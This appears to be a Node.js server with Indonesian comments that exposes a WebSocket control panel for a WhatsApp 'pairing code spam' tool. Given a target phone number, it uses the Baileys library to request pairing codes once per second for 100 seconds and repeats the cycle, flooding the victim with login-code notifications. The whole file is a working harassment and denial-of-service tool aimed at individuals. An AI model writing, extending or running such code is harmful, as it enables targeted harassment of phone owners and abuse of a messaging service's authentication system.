const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const bodyParser = require('body-parser');
const {
    default: spamConnect,
    delay,
    PHONENUMBER_MCC,
    makeCacheableSignalKeyStore,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    makeInMemoryStore,
    jidDecode,
    proto,
    Browsers
} = require("@whiskeysockets/baileys");
const makeWASocket = require("@whiskeysockets/baileys")['default'];
const NodeCache = require('node-cache');
const Pino = require('pino');

const app = express();
const port = process.env.PORT || 3001; // Gunakan port dari environment variabel jika tersedia
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(bodyParser.json());
app.use(express.static('public')); // Pastikan file HTML dan JS berada di folder public

const store = makeInMemoryStore({
    'logger': Pino().child({
        'level': "silent",
        'stream': "store"
    })
});

let spam;
let activeConnections = [];

async function initializeSpam() {
    let { version, isLatest } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState('./targetsessi');
    const msgRetryCounterCache = new NodeCache();
    
    spam = makeWASocket({
        'logger': Pino({
            'level': "silent"
        }),
        'printQRInTerminal': false,
        'browser': Browsers.windows("Firefox"),
        'auth': {
            'creds': state.creds,
            'keys': makeCacheableSignalKeyStore(state.keys, Pino({
                'level': "fatal"
            }).child({
                'level': "fatal"
            }))
        },
        'markOnlineOnConnect': true,
        'generateHighQualityLinkPreview': true,
        'getMessage': async key => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg.message || undefined;
            }
            return {
                'conversation': "SPAM PAIRING CODE"
            };
        },
        'msgRetryCounterCache': msgRetryCounterCache,
        'defaultQueryTimeoutMs': undefined
    });

    store.bind(spam.ev);
}

initializeSpam();

wss.on('connection', (ws) => {
    activeConnections.push(ws);
    console.log('Client connected');

    ws.on('message', async (message) => {
        const { type, phoneNumber } = JSON.parse(message);
        
        if (type === 'START') {
            let second = 100;
            while (second > 0 && activeConnections.includes(ws)) {
                try {
                    let code = await spam.requestPairingCode(phoneNumber);
                    code = code?.['match'](/.{1,4}/g)?.["join"]('-') || code;
                    console.log("Pairing Code: " + code);
                    console.log("Spam Berjalan Selama: " + second + " detik...");
                    activeConnections.forEach(connection => {
                        if (connection.readyState === WebSocket.OPEN) {
                            connection.send(JSON.stringify({ type: 'RESPONSE', code }));
                        }
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Setiap detik
                    second--;
                } catch (error) {
                    activeConnections.forEach(connection => {
                        if (connection.readyState === WebSocket.OPEN) {
                            connection.send(JSON.stringify({ type: 'ERROR' }));
                        }
                    });
                    console.error("Terjadi kesalahan: ", error);
                    break;
                }
            }
            console.log("Mengirim Ulang Dalam 30 detik...");
            await new Promise(resolve => setTimeout(resolve, 30000));
        } else if (type === 'STOP') {
            activeConnections = activeConnections.filter(conn => conn !== ws);
            console.log("Proses spam dihentikan.");
        }
    });

    ws.on('close', () => {
        activeConnections = activeConnections.filter(conn => conn !== ws);
        console.log('Client disconnected');
    });

    ws.onerror = function(error) {
        console.error('WebSocket error:', error);
    };
});

server.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
